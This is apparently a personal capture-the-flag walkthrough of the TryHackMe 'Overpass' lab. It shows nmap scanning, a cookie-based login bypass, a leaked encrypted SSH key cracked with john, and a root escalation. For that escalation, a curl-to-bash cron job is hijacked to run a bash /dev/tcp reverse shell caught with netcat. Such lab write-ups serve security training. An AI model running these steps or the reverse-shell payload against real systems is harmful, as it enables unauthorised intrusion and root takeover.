Port scanning:

```bash
nmap -p- --min-rate=5000 10.10.210.143  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 17:23 EEST
Nmap scan report for 10.10.210.143
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.10.210.143     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 17:23 EEST
Nmap scan report for 10.10.210.143
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```

Ok so we have an ssh and a website that is running some sort of password manager in golang.

We find a name in the source "    <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->"

Maybe we can try to bruteforce an account named Roman?

Ill do some bruteforcing whilst enumerating the machine since why not.

I pressed the hint and it said no bruteforcing is needed. 

```bash
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

We were able to exploit broken access control

The part where it checks statusOrCookie we were just able to change our "sessionToken" and "sessionToken" and it let us into the /admin

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

the website has an RSA key which is helpful. It does have a passphrase which we need to bruteforce with john


```bash
ssh2john id_rsa > john

john --wordlists/usr/share/wordslists/rockyou.txt

john --wordlist=/usr/share/wordlists/rockyou.txt joni 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2025-08-29 17:51) 25.00g/s 334400p/s 334400c/s 334400C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                       
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa james@10.10.210.143                    
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 29 14:52:27 UTC 2025

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 14%                IP address for eth0: 10.10.210.143
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 

```


Some interesting stuff I found in the linpeas scan in did

```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This looks like something we could use to escalate our priviledges

I feel like i could change the overpass.thm to my own ip address and then recreate that path in my own machien and amke it execute a reverse shell. lets try it and see how it goes.

```bash
┌──(kali㉿kali)-[~/Downloads/src]
└─$ cat buildscript.sh 
bash -i >& /dev/tcp/10.6.25.159/4444 0>&1
```
I was wondering why nothing happened but I forgot to setup a http.server so no wonder.
```bash
python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
I also had to change to port 80 since of course it wouldn't use the port 8000 to find my dumb website. Ok it downloaded the scripts but I got no shell. There is clearly something that my dumb brain did not remember.

It's reaching out to use but is unable to get the file. So im atleast partially correct. I decided to change the folder name to a lowercase d. and boom we got a reverse shell.

I knew it had to be some stupid mistake since I have done similar stuff before

```bash
nc -lvnp 4444                    
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.210.143] 49994
bash: cannot set terminal process group (22613): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls -la
ls -la
total 56
drwx------  8 root root 4096 Jun 27  2020 .
drwxr-xr-x 23 root root 4096 Jun 27  2020 ..
lrwxrwxrwx  1 root root    9 Jun 27  2020 .bash_history -> /dev/null
-rw-------  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Jun 27  2020 .cache
drwx------  3 root root 4096 Jun 27  2020 .local
-rw-------  1 root root  184 Jun 27  2020 .profile
drwx------  2 root root 4096 Jun 27  2020 .ssh
-rw-r--r--  1 root root 9947 Aug 29 14:57 buildStatus
drwx------  2 root root 4096 Jun 27  2020 builds
drwxr-xr-x  4 root root 4096 Jun 27  2020 go
-rw-------  1 root root   38 Jun 27  2020 root.txt
drwx------  2 root root 4096 Jun 27  2020 src
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@overpass-prod:~# 
```
